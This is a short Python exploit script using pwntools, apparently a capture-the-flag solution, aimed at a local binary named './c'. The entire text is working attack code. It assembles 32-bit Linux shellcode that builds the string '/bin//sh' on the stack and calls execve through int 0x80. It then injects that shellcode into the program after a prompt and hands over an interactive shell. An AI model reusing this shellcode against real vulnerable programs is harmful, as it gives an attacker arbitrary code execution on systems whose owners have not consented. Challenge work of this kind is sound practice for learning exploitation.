from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
 
io = process('./c')
file = ELF('./c')
 

 
shellcode = """
xor eax, eax;
push eax;
push 0x68732f2f;
push 0x6e69622f;
mov ebx, esp;
xor ecx, ecx;
xor edx, edx;
mov eax, 0xb;
int 0x80;
"""
 
io.recvuntil(b"bytes):\n")
# debug()
shellcode = asm(shellcode, arch='i386', os='linux')
print(f"asm {shellcode}")
io.send(shellcode)
 
io.interactive()
 